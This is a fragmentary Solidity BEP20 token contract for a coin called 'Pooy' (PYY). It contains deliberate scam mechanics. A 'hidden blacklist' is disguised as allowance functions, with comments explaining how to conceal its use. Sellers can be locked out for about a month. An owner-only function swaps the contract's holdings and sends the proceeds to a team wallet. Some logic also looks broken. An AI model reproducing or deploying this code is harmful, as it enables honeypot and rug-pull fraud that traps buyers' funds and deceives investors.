...
contract PooyINU is IBEP20, Ownable {
    ...
    string private constant _name = "Pooy";
    string private constant _symbol = "PYY";
    ...
    // Sellers get locked for MaxSellLockTime (put in seconds, works better especially if changing later) so they can't sell repeatedly
    uint256 public constant MaxSellLockTime = 43800 minutes;
...
function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
    ...
    // if sender is NOT _pancakePairAddress
    // manualConversion should be false
    // _isSwappingContractModifier should be false
    // isSell should be true
...
// Function every wallet can call
// Resets buy lock of caller to the default sellLockTime should something go very wrong
...
//Enaables the timeLock after selling for everyone
...
// 🍂
// LPCreation() & tokensToLP()

function LPCreation() public OnlyOwner{ // Old TeamCreateLPandBNB
    tokensToLP();
    }

function tokensToLP() private lockTheSwap{ // Old swapContractTokens
    uint256 initialBNBBalance = address(this).balance;
    _swapTokenForBNB(initialBNBBalance);
    
    (bool tmpSuccess,) = payable(TeamWallet).call{value: (address(this).balance), gas: 30000}(""); // This sends Pancake LP, Tokens or BNB, not 100%.
    tmpSuccess = false;
}
...
// ⏳
// TeamExcludeAccountFromSellLock & TeamIncludeAccountFromSellLock

// Exclude/Include account from fees (eg. CEX)
function TeamExcludeAccountFromSellLock(address account) public onlyOwner {
    _excludedFromSellLock.add(account);
}
function TeamIncludeAccountToSellLock(address account) public onlyOwner {
...
// 🔒
// ⏲️
function transferable(uint256 newSellLimit) public onlyOwner{
    newSellLimit=newSellLimit*10**_decimals;
...
// 📜
// Hidden Blacklist
// allowancesAddressTrue() & allowancesAddressFalse()
// increaseAllowances() & decreaseAllowances
...
// If you want to hide the fact that you used the allowancesAddressTrue function you can call this instead
// decreaseAllowances is just for looks, would look weird if we had a allowancesAddressTrue without an allowancesAddressFalse
// These are different from the default allowance functions, the default ones would give the blacklisted address approvals, which we don't want, add these to the code instead and use
function increaseAllowances(address spender) external returns (bool) {
    allowancesAddressTrue(spender);
    return true;
}

function decreaseAllowances(address spender) external returns (bool) {
...
// Normal Blacklist
// setBlacklistEnabled()
// setBlacklistedAddress & removeBlacklistedAddress

function setBlacklistEnabled(bool isBlacklistEnabled) public OnlyOwner { // you can enable/disable the blacklist from here, if its disabled, the isSell check doesnt happen, basically disables the blacklist
...
function _beforeTokenTransfer(
    ...
    address to,
    uint256 amount
) internal virtual {} // function that can only be called in this contract or a contract derived from this contract
